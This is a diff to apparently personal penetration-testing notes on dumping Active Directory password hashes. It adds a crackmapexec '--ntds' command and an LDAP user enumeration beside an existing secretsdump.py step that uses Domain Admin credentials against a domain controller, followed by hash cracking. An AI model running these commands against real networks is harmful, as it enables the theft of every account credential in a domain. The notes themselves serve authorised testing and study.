@@ -27,7 +27,7 @@ description: >-
 
 
 
-Method:
+Method (with SecretsDump.py):
 
 1. Run SecretsDump.py with the DA's credentials:
 
@@ -39,6 +39,14 @@ root@kali:~# secretsdump.py [Domain].local/[DA Username]:'[DA Password]'@[DC IP]
 
 -> Grab the NT part of the NTLM hashes
 
+
+Alternatively use CME:
+
+cme ldap <target_ip> --users
+
+```shellscript
+root@kali:~# crackmapexec smb [Target IP] -u [Username] -p [Password] --ntds
+```
 
 
 2. Try to crack the hashes. If you manage to crack them. Reminder of the command to run:
